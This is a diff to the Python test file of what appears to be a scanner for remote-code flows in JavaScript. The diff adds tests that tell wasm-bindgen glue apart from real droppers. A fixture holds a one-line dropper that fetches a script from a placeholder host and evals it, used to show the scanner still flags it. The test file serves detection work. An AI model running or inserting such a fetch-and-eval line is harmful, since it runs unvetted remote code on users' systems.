@@ -50,6 +50,9 @@ GLUE = (
     "}\n"
     "export default __wbg_init;\n"
 )
+#: The same glue as `--target no-modules` writes it: the page names the `.wasm` when it calls `wasm_bindgen(...)`, so the
+#: file never does (rerun's `re_viewer.js`).
+NO_MODULES = GLUE.replace("new URL('pkg_bg.wasm', import.meta.url)", "undefined")
 #: A response run as code, added beside the glue: a dropper whatever else the file holds.
 DROPPER = "fetch('https://cdn.example.invalid/x.js').then(r => r.text()).then(t => eval(t));\n"
 
@@ -65,6 +68,17 @@ class Flows:
 class TestTheGeneratedImport:
     def test_the_glue_is_recognised(self):
         assert WasmBindgenGlue.generated(GLUE)
+
+    def test_glue_that_never_names_its_wasm_is_recognised_by_its_own_init(self):
+        assert "_bg.wasm" not in NO_MODULES
+        assert WasmBindgenGlue.generated(NO_MODULES)
+        assert Flows.remote_code(NO_MODULES) == []
+
+    def test_the_runtime_hooks_alone_are_not_the_glue(self):
+        assert not WasmBindgenGlue.generated("const x = '__wbindgen_throw';\nnew Function(body);\n")
+
+    def test_a_dropper_beside_glue_that_never_names_its_wasm_still_is(self):
+        assert Flows.remote_code(NO_MODULES + DROPPER)
 
     def test_the_shim_line_is_matched_where_it_starts(self):
         start = GLUE.index("        const ret = new Function")
